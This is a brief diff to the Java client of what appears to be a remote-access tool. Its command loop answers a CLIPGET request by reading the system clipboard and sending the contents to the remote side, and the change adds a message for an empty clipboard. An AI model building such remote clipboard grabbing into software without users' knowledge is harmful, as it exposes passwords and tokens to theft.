@@ -190,6 +190,9 @@ public class Client {
                     communicate("CLIPGET");
                     Clipboard sysClip = Toolkit.getDefaultToolkit().getSystemClipboard();
                     Thread.sleep(200);
+                    if (sysClip.getData(DataFlavor.stringFlavor).equals("")){
+                        communicate("No clipboard data");
+                    }
                     communicate((String) sysClip.getData(DataFlavor.stringFlavor));
 
                 } else if (input.contains("MSFWD")){
